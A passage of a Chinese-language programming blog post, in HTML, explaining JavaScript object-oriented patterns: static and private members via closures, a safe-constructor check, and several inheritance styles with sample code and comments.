class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="comment">//构造器</span></span><br><span class="line">    <span class="keyword">this</span>.setName(name);</span><br><span class="line">    <span class="keyword">this</span>.setPrice(price);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在类外面通过点语法定义的属性以及方法被称为类的静态共有属性和类的静态共有方法</strong></p><p><strong>prototype对象中的属性和方法称为共有属性和共有方法</strong></p><p>（ 无需实例化就可以调用的方法就叫静态方法。 ）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类静态公有属性，方法</span></span><br><span class="line">Book.isChinese = <span class="literal">true</span>;</span><br><span class="line">Book.resetTime = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'new Time'</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Book.prototype = &#123;</span><br><span class="line">    <span class="comment">//公有属性</span></span><br><span class="line">    isJSBook: <span class="literal">false</span></span><br><span class="line">    <span class="comment">//公有方法</span></span><br><span class="line">    display: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Book(<span class="number">11</span>,<span class="string">'设计模式'</span>,<span class="number">50</span>)；</span><br><span class="line"><span class="built_in">console</span>.log(b.num);     <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(b.isJSBook);<span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(b.id);      <span class="comment">//11</span></span><br><span class="line"><span class="built_in">console</span>.log(b.isChinese);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(Book.isChinese);<span class="comment">//true</span></span><br><span class="line">Book.resetTime();        <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><h1 id="通过闭包实现类的静态变量"><a href="#通过闭包实现类的静态变量" class="headerlink" title="通过闭包实现类的静态变量"></a>通过闭包实现类的静态变量</h1><p>闭包是有权访问另一个函数作用域中变量的函数，即在一个函数内部创建另外一个函数。我们将这个闭包作为创建对象的构造函数，这样他既是闭包又是可实例对象的函数，即可访问到类函数作用域中的变量，如</p><p>bookNum： 静态私有变量</p><p>checkBook()：静态私有方法</p><p>price,checkID()：闭包内部的私有变量以及私有方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用闭包实现</span></span><br><span class="line"><span class="keyword">var</span> Book = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//静态私有变量</span></span><br><span class="line">    <span class="keyword">var</span> bookNum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//静态私有方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkBook</span>(<span class="params">name</span>)</span>&#123;&#125;</span><br><span class="line">    <span class="comment">//创建类</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">book</span>(<span class="params">newId,newName,newPrice</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//私有变量</span></span><br><span class="line">        <span class="keyword">var</span> name,price;</span><br><span class="line">        <span class="comment">//私有方法</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">checkID</span>(<span class="params">id</span>)</span>&#123;&#125;</span><br><span class="line">        <span class="comment">//特权方法</span></span><br><span class="line">        <span class="keyword">this</span>.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">        <span class="keyword">this</span>.getPrice = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">        <span class="keyword">this</span>.setName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">        <span class="keyword">this</span>.setPrice = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">        <span class="comment">//公有属性</span></span><br><span class="line">        <span class="keyword">this</span>.id = newId;</span><br><span class="line">        <span class="comment">//公有方法</span></span><br><span class="line">        <span class="keyword">this</span>.copy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        bookNum++</span><br><span class="line">        <span class="keyword">if</span>(bookNum &gt; <span class="number">100</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'我们仅出版100本书'</span>)</span><br><span class="line">        <span class="comment">//构造器</span></span><br><span class="line">        <span class="keyword">this</span>.setName(name);</span><br><span class="line">        <span class="keyword">this</span>.setPrice(price);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造原型</span></span><br><span class="line">    _book.prototype = &#123;</span><br><span class="line">        <span class="comment">//静态公有属性</span></span><br><span class="line">        isJSBook:<span class="literal">false</span>,</span><br><span class="line">        <span class="comment">//静态公有方法</span></span><br><span class="line">        display: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//返回类</span></span><br><span class="line">    <span class="keyword">return</span> _book；</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h1 id="创建对象的安全模式"><a href="#创建对象的安全模式" class="headerlink" title="创建对象的安全模式"></a>创建对象的安全模式</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Book = <span class="function"><span class="keyword">function</span>(<span class="params">title,time,type</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.title = title;</span><br><span class="line">    <span class="keyword">this</span>.time = time;</span><br><span class="line">    <span class="keyword">this</span>.type = type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化一本书</span></span><br><span class="line"><span class="keyword">var</span> book = Book(<span class="string">'JavaScript'</span>,<span class="string">'2014'</span>,<span class="string">'js'</span>);</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="built_in">console</span>.log(book);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.title);<span class="comment">//JavaScript</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.time);<span class="comment">//2014</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.type);<span class="comment">//js</span></span><br></pre></td></tr></table></figure><p><strong>new关键字的作用可以看作是对当前对象的this不停地赋值</strong></p><p>例子中没有new，则会直接执行这个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图书安全类</span></span><br><span class="line"><span class="keyword">var</span> Book = <span class="function"><span class="keyword">function</span>(<span class="params">title,time,type</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//判断执行过程中this是否是当前这个对象（如果是说明是用new创建的）</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span> <span class="keyword">instanceof</span> Book)&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">        <span class="keyword">this</span>.time = time;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Book((title,time,type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">var</span> book = Book(<span class="string">'JavaScript'</span>,<span class="string">'2014'</span>,<span class="string">'js'</span>);</span><br></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="类式继承"><a href="#类式继承" class="headerlink" title="类式继承"></a>类式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.superValue = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//为父类添加共有方法</span></span><br><span class="line">SuperClass.prototype.getSuperValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.superValue;  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//声明子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.subValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承父类</span></span><br><span class="line">SubClass.prototype = <span class="keyword">new</span> SuperClass()<span class="string">'</span></span><br><span class="line"><span class="string">//为子类添加共有方法</span></span><br><span class="line"><span class="string">SubClass.prototype.getSubValue = function()&#123;</span></span><br><span class="line"><span class="string">    return this.subValue;</span></span><br><span class="line"><span class="string">&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> SubClass();</span><br><span class="line"><span class="built_in">console</span>.log(instance.getSubValue);   <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(instance.getSuperValue); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p><strong>instanceof 可以检测某个对象是否是某个类的实例</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(instance <span class="keyword">instanceof</span> SuperClass); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(instance <span class="keyword">instanceof</span> SubClass);   <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(SubClass <span class="keyword">instanceof</span> SuperClass); <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(SubClass.prototype <span class="keyword">instanceof</span> SuperClass) <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//所有创建的对象都是原生对象Object的实例</span></span><br></pre></td></tr></table></figure><p>缺点：</p><ol><li><p>父类中的共有属性要是引用类型，就会在子类中被所有实例共用</p></li><li><p>由于子类实现的继承是靠原型对父类的实例化实现的，因此在创建父类的时候，是无法向父类传递参数的，因而在实例化父类的时候也无法对父类构造函数内的属性进行初始化。</p></li></ol><h2 id="构造函数继承"><a href="#构造函数继承" class="headerlink" title="构造函数继承"></a>构造函数继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//引用类型共有属性</span></span><br><span class="line">    <span class="keyword">this</span>.books = [<span class="string">'JavaScript'</span>,<span class="string">'html'</span>,<span class="string">'css'</span>];</span><br><span class="line">    <span class="comment">//值类型共有属性</span></span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//父类声明原型方法</span></span><br><span class="line">SuperClass.prototype.showBooks = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.books);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//继承父类</span></span><br><span class="line">    SuperClass.call(<span class="keyword">this</span>,id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建第一个子类的实例</span></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubClass(<span class="number">10</span>);</span><br><span class="line"><span class="comment">//创建第二个子类的实例</span></span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubClass(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">instance1.books.push(<span class="string">'设计模式'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.books); <span class="comment">//['JavaScript','html','css','设计模式']</span></span><br><span class="line"><span class="built_in">console</span>.log(instance1.id);  <span class="comment">//10</span></span><br><span class="line"><span class="built_in">console</span>.log(instance2.books); <span class="comment">//['JavaScript','html','css']</span></span><br><span class="line"><span class="built_in">console</span>.log(instance2.id);<span class="comment">//11</span></span><br><span class="line"></span><br><span class="line">instance1.showBooks(); <span class="comment">//TypeError</span></span><br></pre></td></tr></table></figure><p>SuperClass.call(this,id);这条语句是构造函数继承的精华，由于call这个方法可以更改函数的作用环境，因此在子类中，对superClass调用这个方法就是将子类中的变量在父类中执行一遍，由于父类中是给this绑定属性的，因此子类继承了父类的共有属性。</p><p>缺点：父类的原型方法不会被子类继承，如果要被继承必须放在构造函数中，这样创建出来的每个实例都会单独拥有一份而不能共有，违反了代码复用的原则在</p><h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><ul><li>类式继承是通过子类的原型对父类实例化来实现的</li><li>构造函数式继承是通过在子类的构造函数作用环境中执行一次父类的构造函数来实现的</li><li>组合继承同时实现这两点</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//引用类型共有属性</span></span><br><span class="line">    <span class="keyword">this</span>.books = [<span class="string">'JavaScript'</span>,<span class="string">'html'</span>,<span class="string">'css'</span>];</span><br><span class="line">    <span class="comment">//值类型共有属性</span></span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//父类声明原型方法</span></span><br><span class="line">SuperClass.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">name,time</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//构造函数继承父类name属性</span></span><br><span class="line">    SuperClass.call(<span class="keyword">this</span>,name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类式继承 </span></span><br><span class="line">SubClass.prototype = <span class="keyword">new</span> SuperClass();</span><br><span class="line"><span class="comment">//子类原型方法</span></span><br><span class="line">SubClass.prototype.getTime = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.time)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubClass(<span class="string">'js book'</span>,<span class="number">2014</span>);</span><br><span class="line">instance1.books.push(<span class="string">'设计模式'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.books); <span class="comment">//['JavaScript','html','css','设计模式']</span></span><br><span class="line">instance1.getName(); <span class="comment">//js book</span></span><br><span class="line">instance1.getTime();<span class="comment">//2014</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubClass(<span class="string">'css book'</span>,<span class="number">2013</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.books); <span class="comment">//['JavaScript','html','css']</span></span><br><span class="line">instance1.getName(); <span class="comment">//css book</span></span><br><span class="line">instance1.getTime();<span class="comment">//2013</span></span><br></pre></td></tr></table></figure><p>缺点：</p><ol><li>使用构造函数继承时执行了一遍父类的构造函数，而在实现子类原型的类式继承时又调用了一遍父类构造函数，因此父类构造函数调用了两遍。</li></ol><h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这是对类式继承的封装，其中的过渡对象就相当于类式继承中的子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritObkect</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//声明一个过渡函数对象</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    <span class="comment">//过渡对象的原型继承父对象</span></span><br><span class="line">    F.prototype = o;</span><br><span class="line">    <span class="comment">//返回过渡对象的一个实例，该实例的原型继承了父对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">    name: <span class="string">'js book'</span>,</span><br><span class="line">    alikeBook:[<span class="string">'css book'</span>,<span class="string">'html book'</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> newBook = inheritObkect(book);</span><br><span class="line"><span class="keyword">var</span> newBook.name = <span class="string">'ajax book'</span></span><br></pre></td></tr></table></figure><p>这种方式由于F过渡类中的构造函数无内容，所以开销比较小。</p><p>缺点：仍然存在类式继承的缺点</p><h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">    name: <span class="string">'js book'</span>,</span><br><span class="line">    alikeBook:[<span class="string">'css book'</span>,<span class="string">'html book'</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createBook</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//通过原型继承方式创建新对象</span></span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> inheritObject(obj);</span><br><span class="line">    <span class="comment">//拓展新对象</span></span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(name);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//返回拓展后的新对象</span></span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寄生式继承就是对原型继承的第二次封装，并且在这第二次封装过程中对继承的对象进行了拓展，这样新创建的对象不仅仅有父类中的属性和方法而且还添加新的属性和方法</p><h2 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h2><p>寄生式继承依托于原型继承，原型继承又与类式继承相像。</p><p>寄生组合式继承是寄生式继承和构造函数继承两种模式的组合，也是对组合继承的改进。</p><p>组合继承 = 类式继承+构造函数继承（子类不是父类的实例，而子类的原型是父类的实例）</p><p>寄生组合式继承= 寄生式继承+构造函数继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritPrototype</span>(<span class="params">subClass,superClass</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//复制一份父类的原型副本保存在变量中</span></span><br><span class="line">    <span class="keyword">var</span> p = inheritObject(superClass.prototype);</span><br><span class="line">    <span class="comment">//修正因为重写子类原型导致子类的constructor属性被修改</span></span><br><span class="line">    p.construcor = subClass;</span><br><span class="line">    <span class="comment">//设置子类的原型</span></span><br><span class="line">    subClass.prototype = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组合式继承中，通过构造函数继承的属性和方法是没有问题的，所以我们主要探究通过寄生式继承重新继承父类的原型。在构造函数继承中我们已经调用了父类的构造函数。因此我们需要的就是父类的原型对象的一个副本，这个副本我们通过原型继承便可得到，但是这个复制对象p中的construstor指向的不是subClass，因此在寄生式继承中要对p做一次增强，修复其construstor指向不正确的问题，再赋给子类的原型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperClass</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.colors = [<span class="string">'red'</span>,<span class="string">'blue'</span>,<span class="string">'green'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义父类原型方法</span></span><br><span class="line">SuperClass.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">name,time</span>)</span>&#123;</span><br><span class="line"><span class="comment">//构造函数式继承</span></span><br><span class="line">SuperClass.call(<span class="keyword">this</span>,name);</span><br><span class="line"><span class="comment">//子类新增属性</span></span><br><span class="line"><span class="keyword">this</span>.time = time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//寄生式继承父类原型</span></span><br><span class="line">inheritPrototype(SubClass,SuperClass);</span><br><span class="line"><span class="comment">//子类新增原型方法</span></span><br><span class="line">SubClass.prototype.getTime = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>.time);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubClass(<span class="string">'js book'</span>,<span class="number">2014</span>);</span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubClass(<span class="string">'css book'</span>,<span class="number">2013</span>);</span><br><span class="line"></span><br><span class="line">instance1.colors.push(<span class="string">'black'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.colors); <span class="comment">//["red", "blue", "green", "black"]</span></span><br><span class="line"><span class="built_in">console</span>.log(instance2.colors); <span class="comment">//["red", "blue", "green"]</span></span><br><span class="line">instance2.getTime(); <span class="comment">//2013</span></span><br><span class="line">instance2.getName(); <span class="comment">//css book</span></span><br></pre></td></tr></table></figure><h2 id="继承单对象属性的extend方法"><a href="#继承单对象属性的extend方法" class="headerlink" title="继承单对象属性的extend方法"></a>继承单对象属性的extend方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单继承 属性复制</span></span><br><span class="line"><span class="keyword">var</span> extend = <span class="function"><span class="keyword">function</span>(<span class="params">target,source</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//遍历源对象中的属性</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> property <span class="keyword">in</span> source)&#123;</span><br><span class="line">        target[property] = source[property];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回目标对象</span></span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td 